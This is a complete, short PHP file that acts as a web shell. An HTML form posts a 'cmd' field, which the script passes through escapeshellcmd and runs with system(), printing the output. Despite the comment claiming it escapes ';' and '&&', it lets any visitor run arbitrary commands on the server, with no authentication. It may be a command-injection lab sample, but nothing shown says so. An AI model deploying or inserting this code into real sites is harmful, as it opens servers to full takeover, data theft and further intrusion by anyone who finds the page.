<?php
if($_SERVER["REQUEST_METHOD"] === "POST"){

    $cmd = escapeshellcmd($_POST["cmd"]);  // escape ; and &&
    print_r($cmd);
    echo "<pre>";
    system($cmd);
    echo "</pre>";
}
?>

<form method="post">
    <input type="text" name="cmd"/>
    <input type="submit" value="Send"/>
</form>
